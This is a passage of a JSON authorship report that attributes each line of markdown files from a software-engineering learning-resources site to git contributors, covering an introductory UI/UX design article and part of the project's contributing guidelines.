          "gitId": "-"
        },
        "content": "## Additional Resource(s)"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "1. [List of Meetups/Conferences/Resources in Singapore](https://interface.sg/)"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 8,
      "jamessspanggg": 4,
      "iskandarzulkarnaien": 3,
      "-": 113
    }
  },
  {
    "path": "contents/uix/uix.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: UI/UX"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to UI/UX"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Ang Shi Ya](https://github.com/AngShiYa), [Tan Jun Kiat](https://github.com/junkiattan)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Overview](#overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [User Interface vs User Experience](#user-interface-vs-user-experience)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [UI Design](#ui-design)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [UX Design](#ux-design)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Which is more important?](#which-is-more-important)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [The Process of UX Design](#the-process-of-ux-design)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Preliminary Research](#preliminary-research)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Prototyping](#prototyping)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [User Testing](#user-testing)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Maintenance](#maintenance)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Ending Notes](#ending-notes)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "User Interface (UI) and User Experience (UX) are terms often used interchangeably. In fact, these two terms are quickly becoming dangerous buzzwords that are used inaccurately, creating massive confusion in the industry. A simple Google search will show that UI Designer and UX Designer jobs are listed under similar titles and descriptions. "
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "In addition to helping us identify and apply for the right role, understanding the key differences between UI and UX helps us in using the right concept in our own applications. This document will address the difference between UI and UX as well as some of the techniques used in UI Design and UX Design."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "## User Interface vs User Experience"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "UI is about the design of the buttons, the layout of the website and the responsiveness of the application. It encompasses the presentation and interactivity of the application. On the other hand, UX is concern with the ease of use and the pleasure provided through using the application. In short, UI is about the look and feel while UX is about customer satisfaction."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "Due to the overlapping nature of UI and UX, you might still have some questions such as *\u0027Doesn\u0027t improving the UI also improve the UX?\u0027* Indeed, it does. In fact, UI **can** be part of UX."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003e Note that **can** is used because UI is no longer a necessity to UX due to the emergence of [zero UI](https://blog.careerfoundry.com/ui-design/what-is-zero-ui), which won\u0027t be covered here."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "To gain a better understanding, let\u0027s look at real life examples of good UI but bad UX. A prime example would be the [Mystery Meat Navigation](https://www.techinasia.com/talk/material-design-mystery-meat-navigation-problem) problem. It refers to buttons and links that do not explain themselves; users have to click on them to find out where it leads. In essence, the pursuit of clean and neat UI has resulted in omission of details that provide clarity for the user. This results in bad UX because people do not like to puzzle over how things work. A good UX should never make the user think."
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "If you would like to read more about the differences between UI and UX, here are a few articles:"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [The Difference Between UX and UI Design-A Layman’s Guide](https://blog.careerfoundry.com/ui-design/the-difference-between-ux-and-ui-design-a-laymans-guide/) - provides breakdown of the disciplines involved."
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "* [What’s the difference between UI and UX?](https://www.usertesting.com/blog/2016/04/27/ui-vs-ux/) - provides opinions from UX experts."
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "* [The superpowers of UX \u0026 UI designers](https://www.ymedialabs.com/ux-vs-ui/) - provides illustrations to highlight the differences."
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "## UI Design"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "Flat and minimalist design are technically easier to create than realistic design. Thanks to the rise of flat and minimalist design you don\u0027t have to be a photoshop expert to get started on UI design. "
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "A good way to start is by observing existing designs. Use existing UI Designs as references and try to apply the design patterns in your own application. Using [UI design guidelines](https://www.goodui.org/) can help to highlight and avoid common mistakes. Online lessons like [Hack Design](https://hackdesign.org/lessons#graphic-design-principles) also provide a variety of materials covering the basics of UI design. The best thing is that they are free!"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "Here is a non-exhaustive list of UI design concepts you can choose to dive into if you are interested:"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "* Color Theory - Take a look at [Smashing Magazine](https://www.smashingmagazine.com/2010/01/color-theory-for-designers-part-1-the-meaning-of-color/) for a introduction to color theory"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "* Grid system - This [article](https://webdesign.tutsplus.com/articles/a-comprehensive-introduction-to-grids-in-web-design--cms-26521) provides a comprehensive overview on the grid system"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "* Typography - Here is an [article](https://www.springboard.com/blog/best-resources-typography-design-online/) that has a list of resources to get you started on typography"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "* Iconography - Take a look at [Metro Studio](https://www.syncfusion.com/downloads/metrostudio) for free icons."
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "* Visual Hierarchy - This [article](https://www.awwwards.com/understanding-web-ui-visual-hierarchy.html) covers the different techniques used to create visual hierachies"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* Flat vs Skeuomorphism - This [article](https://www.webinsation.com/flat-design-some-good-some-bad/) provides the good and bad of flat design"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "## UX Design"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "At it\u0027s core, UX Design is about understanding both user and business goals, and tailoring a product that strikes a right balance between both goals within given constraints such as budget or time."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "Just like Software Development, UX Design is an iterative process. It involves many stages like researching, planning, testing, and at each stage are many different techniques that you could use. A good place to find these techniques would be the [UX Project Checklist](https://uxchecklist.github.io/) created by Andrea Soverini."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Which is More Important?"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "The metaphor of building a house by Clayton Yan (UX Designer at UserTesting) illustrates this aptly. UX is the structure (i.e. the number of rooms, one-storey or two-storey and where the front door leads). Meanwhile, UI is about the visual (i.e. whether the same wallpaper or vases is used). A good UX with bad UI is like an ugly house with nice structure. A good UI with bad UX is like a beautiful house with the front door leading straight to the bathroom. To sum it up, UI and UX are **equally** important in creating an awesome experience for the users. "
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "## The Process of UX Design"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "As stated above, UX is a highly iterative process to achieve a fine balance between meeting the needs of the target audience and achieving business goals. Many times the functionality of a product is prioritised over the experience it gives. However this should not be the case when experience is the deciding factor in delighting or frustrating users."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "Catering the right experiences for users does not have to be difficult. The stages of UX Design are logical and can be decomposed into four main stages as shown, with each section supplemented with what you would do during each stage, and the expected deliverables at the end of each stage."
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "1. Preliminary Research"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "1. Prototyping"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "1. User Testing"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "1. Maintenance"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "### Preliminary Research"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "The first stage is Preliminary Research. This is where you would:"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "  * Understand your target audience through [Contextual Inquiry](https://www.usabilitybok.org/contextual-inquiry), which involves interviewing users to find out about their wants, needs and pain-points, in the setting of them using the actual product and/or products from competitors"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "  * Gather the tools needed for the project such as wireframing or prototyping [tools](https://medium.com/@Mockplus/the-10-best-wireframing-and-prototyping-tools-for-designers-a808e81ecadf) for creating low to high fidelity products for testing"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "  * Depending on whether the project is self-initiated (taking a known product and re-designing it) or client-based (working for businesses or non-profits), discuss and create a project plan with stakeholders"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "#### Deliverables"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Personas](https://static1.squarespace.com/static/519deddfe4b07b846eef9842/55915575e4b0a919cf5a0da5/55a5b693e4b0576c4f936a78/1436923548676/11_all_with_eps_brands.jpg?format\u003d750w) - User profiles that are representative of the target audiences"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "  * [User Stories](https://i.pinimg.com/originals/00/ac/37/00ac379ca5b9c28de3d56bdea4580e2e.jpg) - Representation of the most important user actions or motivations for each persona"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "  * [User Scenarios](http://www.davedoyle.com/prof/portfolio/images/large/petcare_scenario.gif) - Case studies of how users use the products, supplementing User Stories to allow you to better empathize with the users"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "  * [User Flows](https://cdn-images-1.medium.com/max/1600/0*aO_6rai_fTnSe5rh.) - Depiction of how users navigate through the product for each scenario"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "### Prototyping"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "After Preliminary Research, the next stage is Prototyping. This is where you would:"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Test](https://usabilitygeek.com/usability-testing-prototypes/) whether the product flow you came up with is smooth"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "  * Create [prototypes](https://www.mockplus.com/blog/post/wireframe-mockup-prototype-selection-of-prototyping-tools), or Minimum Viable Product (MVP), for further testing and refinement"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "  * Use studies gathered from the previous stage to get a better sense of how users would interact with the final product, which would be further refined in the User Testing stage"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "#### Deliverables"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Wireframes](https://wireframesketcher.com/samples/YouTube.png) - Depicts a skeleton version of an application, meant to develop a unified vision of content structure instead of focusing on asthetics; may or may not be clickable"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "  * [UI Elements](https://thumbs.dreamstime.com/z/flat-ui-design-elements-set-icons-buttons-progress-bars-vector-illustration-light-colors-33417705.jpg) - Basic visual components, which can start out basic and increase in quantity/quality with the fidelity of MVP"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Mockups](https://i0.wp.com/brandhorse.com/wp-content/uploads/2016/01/EZ-Frabic-Mobile-App-UX-UI-Design.jpg?resize\u003d960%2C750) - Built upon an agreed version of wireframe with higher fidelity and asthetics"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "### User Testing"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "After Prototyping, the next stage is User Testing. This is where you would:"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "  * Have a clear sense of the user goals at this stage"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "  * Use a low or high fidelity prototype during [usability testing](https://www.uxbooth.com/articles/usability-testing-dont-guess-test/) to determine product effectiveness"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "  * Follow an [iterative design process](https://www.interaction-design.org/literature/article/design-iteration-brings-powerful-results-so-do-it-again-designer) to re-prototype after gathering user feedback"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "#### Deliverables (before actual testing with users)"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Usability Test Plan](https://www.smileycat.com/wp-content/uploads/2016/05/usability-test-plan-dashboard.png) - Summary of background, goals, and test methodology"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "  * [User Testing Script](http://www.ariadne.ac.uk/images/issue62-loureiroKoechlin/CeciliaLoureiroKoechlin-03-small.gif) - What to say as the facilitator, encouraging users to think out loud during the test"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "#### Deliverables (after actual testing with users)"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Usability Reports](https://image.slidesharecdn.com/january2012nhupa-120206210831-phpapp02/95/delivering-results-how-do-you-report-user-research-findings-18-728.jpg?cb\u003d1374224669) - Thorough introduction to what aspects of the product was or was not effective and how to improve"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Journey Maps](https://cdn-images-1.medium.com/max/1600/1*jAfZXNWAx50fWEvoF-eWLw.png) - More detailed user flow based on how users are observed to use the product in actual testing conditions"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Refined Prototype](https://cdn-images-1.medium.com/max/1600/1*8qPOD1DG19Kj2sfJkTk3Eg.png) - A more refined prototype that is closer to meeting user expectations, each iteration should always be tested before moving to a higher fidelity"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "### Maintenance"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "After User Testing and the launch of the final product, the next stage is Maintenance. This is where you would:"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "  * Follow-up with the product after the final product launch"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "  * Recursively update, revise and maintain the content in the application"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "#### Deliverables"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Sitemaps](http://www.kristenjoybaker.com/uploads/1/3/7/6/13760055/3563790_orig.jpg) - Depiction of how all pages of the product interconnect"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Taxonomies](http://blog.fuzzymath.com/wp-content/uploads/2015/09/UCAN_Taxonomy-1024x775.png) - Organized depiction of how features or information in the product relate to one another"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Content Governance Plans](https://image.slidesharecdn.com/contentstrategyin2015-150706154016-lva1-app6891/95/slide-43-1024.jpg) - Complete strategy for updating, revising and maintaining all content within the product"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "### Ending Notes"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "The clearly-stated objectives and deliverables of each stage culminate in a well-defined target audience and a well-designed prototype needed to match the expectations of that audience. UX Design requires empathy in the users\u0027 shoes and effort to address their problems, however all that is worth it in the grand scheme of delighting users when they use your applications."
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 1,
      "jamessspanggg": 6,
      "iskandarzulkarnaien": 15,
      "-": 119
    }
  },
  {
    "path": "contributing.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: \"Contributing to this Project\""
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "# Contributing to this Project"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "We welcome contributions to this project."
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "## How to Contribute"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "You can report errors, send suggestions, ask questions. \u003ctrigger trigger\u003d\"click\" for\u003d\"modal:contributing-contactInfo\"\u003eHere\u003c/trigger\u003e is how you can contact us."
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "You can also add new topics or update existing content by following these steps:"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "* [Fork this repo](https://github.com/se-edu/learningresources/fork) and clone it to your Computer."
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "* Install [MarkBind](https://markbind.github.io) in your Computer."
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "* Post in [our issue tracker](https://github.com/nus-oss/learningresources/issues) an outline of your proposed contribution. Wait for our response."
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "* After receiving the go-ahead from us, send your proposed contribution as a PR."
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cmodal large title\u003d\"How to contact us\" id\u003d\"modal:contributing-contactInfo\"\u003e"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cinclude src\u003d\"about.md#contact-info\" /\u003e"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/modal\u003e"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "## Guidelines for Writing Content"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* **Do include a table of contents.** A table of contents tells the reader what to expect, such as how long the article is and what content is covered. It also serves as a reference that makes it easier to jump around from section to section. In our case, we only show the table of contents for mobile users and for printing as Markbind already provides a navigation panel on the right side of every article. Feel free to refer to this [pull request](https://github.com/se-edu/learningresources/pull/185) to see how to implement this behavior."
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* **Do use Title Case for headings.** Using title case for headings gives articles a more polished, professional look that is more pleasing to the eye. If you are unfamiliar with the rules of title casing, you may refer to the following [website](https://apastyle.apa.org/style-grammar-guidelines/capitalization/title-case) or use online title case converters such as the one found [here](https://titlecase.com/)."
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "* **It is not a normal textbook. It’s a collection of articles**, each containing a **_curated_** list of **_tried-and-tested_** learning resources, **_organized_** in a meaningful sequence, with **_commentary_**."
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "  * The article can be on any technical topic useful for SE students."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "  * Don’t try to follow the structure of normal textbooks."
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "  * There’s no need to use a very formal tone that you see in some text books. Instead, prefer an informal tone you would use in a blog post or an stackoverflow question."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "  * The article should point to the _best_ (in your opinion) external learning resources for the topic. That means it should not include resources that you did not try yourself."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "* ****The suggested structure**** for an Article"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "  * **What is X?**: Explain how X fits into the big picture of SE. Describe it relative to topics the reader is likely to know."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "  * **Why X?**: Motivate the reader to learn about X. Describe benefits of X to make the reader interested in X. Try to give a balanced view of by mentioning also WHY NOT X i.e., mention both advantages and disadvantages."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "  * **How does X work?** How is X being used? This is a simple high-level overview of the tool to give the reader some concrete sense of X (as opposed to limiting to an entirely abstract description). It\u0027s useful to give concrete examples such as code examples. \u003d\u003dDo not try to \u0027teach\u0027 how to use the X\u003d\u003d (assuming your in the style of a tutorial. If the tool is worth learning, there must be good tutorials about it already."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "  * **How to Get Started with X?**: Provide a learning path for the reader. Try to give one good learning path rather than many random resources."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "  * **Where to Go from Here?**: Give more resources. Instead of listing a lot of links, provide a brief summary of what value each resource can provide the reader."
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "* **Do not assume a lot of prior knowledge on the part of the reader.** The less prior knowledge you assume, the wider your reader base becomes. The article is aimed at typical SE students, but not necessarily SE students in your school. Just because it is covered in a core module in your school does not mean it will be known to every reader."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
